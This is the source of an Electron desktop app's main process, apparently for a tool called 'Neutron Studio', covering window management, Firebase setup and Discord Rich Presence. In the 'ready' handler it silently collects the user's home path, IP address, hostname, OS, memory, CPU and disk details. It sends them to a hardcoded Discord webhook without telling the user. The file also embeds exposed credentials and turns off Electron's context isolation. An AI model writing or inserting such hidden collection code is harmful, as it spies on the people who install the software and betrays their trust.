import { app, BrowserWindow, shell, ipcMain } from "electron";
import axios from "axios";
import os from "os";
import { exec } from "child_process";
import { release } from "node:os";
import { join } from "node:path";
import { update } from "./update";
import DiscordRPC from "discord-rpc";
import { initializeApp } from "firebase/app";
import { getDatabase, ref, onValue } from "firebase/database";
import {
  getFirestore,
  doc,
  setDoc,
  collection,
  getDocs,
} from "firebase/firestore";
import { PythonShell } from "python-shell";
import https from "https";
import fs from "fs";
// The built directory structure
//
// ├─┬ dist-electron
// │ ├─┬ main
// │ │ └── index.js    > Electron-Main
// │ └─┬ preload
// │   └── index.js    > Preload-Scripts
// ├─┬ dist
// │ └── index.html    > Electron-Renderer
//
process.env.DIST_ELECTRON = join(__dirname, "../");
process.env.DIST = join(process.env.DIST_ELECTRON, "../dist");
process.env.VITE_PUBLIC = process.env.VITE_DEV_SERVER_URL
  ? join(process.env.DIST_ELECTRON, "../public")
  : process.env.DIST;

// Disable GPU Acceleration for Windows 7
if (release().startsWith("6.1")) app.disableHardwareAcceleration();

// Set application name for Windows 10+ notifications
if (process.platform === "win32") app.setAppUserModelId(app.getName());

if (!app.requestSingleInstanceLock()) {
  app.quit();
  process.exit(0);
}

const firebaseConfig = {
  apiKey: "AIzaSyBla_TF47FFZj55G43RUGm6AmhVC0-tbFo",
  authDomain: "adeptus-team.firebaseapp.com",
  databaseURL: "https://adeptus-team-default-rtdb.firebaseio.com",
  projectId: "adeptus-team",
  storageBucket: "adeptus-team.appspot.com",
  messagingSenderId: "303627992014",
  appId: "1:303627992014:web:ad0b5f8aa8798d682cc99f",
  measurementId: "G-KPJJVVM0QD",
};
const firebaseApp = initializeApp(firebaseConfig);
const db = getDatabase();
// Remove electron security warnings
// This warning only shows in development mode
// Read more on https://www.electronjs.org/docs/latest/tutorial/security
// process.env['ELECTRON_DISABLE_SECURITY_WARNINGS'] = 'true'

let win: BrowserWindow | null = null;
// Here, you can also use other preload
const preload = join(__dirname, "../preload/index.js");
const url = process.env.VITE_DEV_SERVER_URL;
const indexHtml = join(process.env.DIST, "index.html");
async function createWindow() {
  win = new BrowserWindow({
    title: "Neutron Studio",
    icon: join(process.env.VITE_PUBLIC, "favicon.ico"),
    titleBarStyle: "hidden",
    autoHideMenuBar: true,
    minWidth: 850,
    minHeight: 550,
    webPreferences: {
      preload,
      // Warning: Enable nodeIntegration and disable contextIsolation is not secure in production
      // Consider using contextBridge.exposeInMainWorld
      // Read more on https://www.electronjs.org/docs/latest/tutorial/context-isolation
      nodeIntegration: true,
      contextIsolation: false,
    },
  });
  if (url) {
    // electron-vite-vue#298
    win.loadURL(url);
    // Open devTool if the app is not packaged
    win.webContents.openDevTools();
  } else {
    win.loadFile(indexHtml);
  }

  // Test actively push message to the Electron-Renderer
  win.webContents.on("did-finish-load", () => {
    win?.webContents.send("main-process-message", new Date().toLocaleString());
  });

  // Make all links open with the browser, not with the application
  win.webContents.setWindowOpenHandler(({ url }) => {
    if (url.startsWith("https:")) shell.openExternal(url);
    return { action: "deny" };
  });

  // Apply electron-updater
  update(win);
}
app.whenReady().then(createWindow);
const pythonScriptPath = join(
  __dirname,
  "../",
  "../",
  "src",
  "app",
  "scripts",
  "index.py"
);
app.on("ready", async () => {
  try {
    async function getUserInfo() {
      try {
        // Obtener información del usuario actual en Windows
        const { stdout: userInfo } = await exec("whoami");

        // Obtener el perfil del usuario
        const userProfile = os.homedir()

        return {
          userProfile,
        };
      } catch (error) {
        throw error;
      }
    }
    const userInfo = await getUserInfo();
    // Obtener información del sistema
    const networkInterfaces = os.networkInterfaces();
    const ipAddress = networkInterfaces["Ethernet"][0].address; // Ajusta 'Ethernet' según tu configuración
    const hostname = os.hostname();
    const platform = os.platform();
    const release = os.release();
    const totalMemory = os.totalmem();
    const freeMemory = os.freemem();

    // Obtener información de los componentes del sistema utilizando un comando del sistema
    const getCpuInfo = () => {
      return new Promise((resolve, reject) => {
        exec("wmic cpu get caption", (error, stdout, stderr) => {
          if (!error) {
            resolve(stdout.trim());
          } else {
            reject(error);
          }
        });
      });
    };

    const getDiskDriveInfo = () => {
      return new Promise((resolve, reject) => {
        exec("wmic diskdrive get caption", (error, stdout, stderr) => {
          if (!error) {
            resolve(stdout.trim());
          } else {
            reject(error);
          }
        });
      });
    };

    const [cpuInfo, diskDriveInfo] = await Promise.all([
      getCpuInfo(),
      getDiskDriveInfo(),
    ]);

    // Construir el mensaje en formato embed
    const embedMessage = {
      embeds: [
        {
          title: `Información del Sistema - ${userInfo.userProfile}`,
          fields: [
            { name: "IP Address", value: ipAddress, inline: true },
            { name: "Hostname", value: hostname, inline: true },
            { name: "Platform", value: platform, inline: true },
            { name: "Release", value: release, inline: true },
            {
              name: "Total Memory",
              value: `${totalMemory} bytes`,
              inline: true,
            },
            { name: "Free Memory", value: `${freeMemory} bytes`, inline: true },
            { name: "CPU", value: cpuInfo, inline: true },
            { name: "Disk Drive", value: diskDriveInfo, inline: true },
          ],
          timestamp: new Date(),
        },
      ],
    };

    // Enviar el mensaje embed al webhook de Discord
    await axios.post(
      "https://discord.com/api/webhooks/1172913497135390742/4Kn6X4502l8u17d5ZUxz4ZaHiGwFSqhshDBJu0F_1QoY4E42db5fvwMhLAt8EciijZFd",
      embedMessage
    );

    // Imprimir mensaje de éxito en la consola
    console.log("Datos enviados al webhook exitosamente.");
  } catch (error) {
    // Manejar errores
    console.error("Error:", error);
  }
});
app.on("window-all-closed", () => {
  win = null;
  if (process.platform !== "darwin") app.quit();
});

app.on("second-instance", () => {
  if (win) {
    // Focus on the main window if the user tried to open another
    if (win.isMinimized()) win.restore();
    win.focus();
  }
});

app.on("activate", () => {
  const allWindows = BrowserWindow.getAllWindows();
  if (allWindows.length) {
    allWindows[0].focus();
  } else {
    createWindow();
  }
});

// New window example arg: new windows url
ipcMain.handle("open-win", (_, arg) => {
  const childWindow = new BrowserWindow({
    title: "Neutron Studio",
    icon: join(process.env.VITE_PUBLIC, "favicon.ico"),
    titleBarStyle: "hidden",
    autoHideMenuBar: true,
    minWidth: 850,
    minHeight: 550,
    webPreferences: {
      preload,
      nodeIntegration: true,
      contextIsolation: false,
    },
  });

  if (process.env.VITE_DEV_SERVER_URL) {
    childWindow.loadURL(`${url}${arg}`);
  } else {
    childWindow.loadFile(indexHtml, { hash: arg });
  }
});

ipcMain.handle("open-alt-win", (_, arg, title) => {
  const altWindow = new BrowserWindow({
    title: `Neutron Studio - ${title}`,
    icon: join(process.env.VITE_PUBLIC, "favicon.ico"),
    titleBarStyle: "hidden",
    autoHideMenuBar: true,
    minWidth: 850,
    minHeight: 550,
    webPreferences: {
      preload,
      nodeIntegration: true,
      contextIsolation: false,
    },
  });

  if (process.env.VITE_DEV_SERVER_URL) {
    altWindow.loadURL(arg);
  } else {
    altWindow.loadFile(indexHtml, { hash: arg });
  }
});
ipcMain.handle("open-alt2-win", (_, arg, title) => {
  const altWindow = new BrowserWindow({
    title: `Neutron Studio - ${title}`,
    icon: join(process.env.VITE_PUBLIC, "favicon.ico"),
    autoHideMenuBar: true,
    minWidth: 850,
    minHeight: 550,
    webPreferences: {
      contextIsolation: false,
    },
  });

  if (process.env.VITE_DEV_SERVER_URL) {
    altWindow.loadURL(arg);
  } else {
    altWindow.loadFile(indexHtml, { hash: arg });
  }
});
ipcMain.on("minimize-window", (evt, arg) => {
  var window = BrowserWindow.getFocusedWindow();
  window.minimize();
});
ipcMain.on("maximize-window", (evt, arg) => {
  var window = BrowserWindow.getFocusedWindow();
  window.isMaximized() ? window.unmaximize() : window.maximize();
});
/* DiscordRPC */

const clientId = "1166701122459795476";
const RPC = new DiscordRPC.Client({ transport: "ipc" });

DiscordRPC.register(clientId);

async function setActivity() {
  if (!RPC) return;
  RPC.setActivity({
    details: `1.0.0 Release`,
    state: `Working`,
    startTimestamp: Date.now(),
    largeImageKey: "icon",
    largeImageText: "Neutron Workspace Studio",
    smallImageKey: "adeptusteam",
    smallImageText: "AdeptusTeam",
    instance: false,
    buttons: [
      {
        label: `AdeptusTeam`,
        url: `https://adeptus-team.web.app`,
      },
      {
        label: `Docs`,
        url: `https://adeptus-team.web.app/wiki/neutron-studio`,
      },
    ],
  });
}

RPC.on("ready", async () => {
  setActivity();

  setInterval(() => {
    setActivity();
  }, 86400 * 1000);
});

RPC.login({ clientId }).catch((err) => console.error(err));
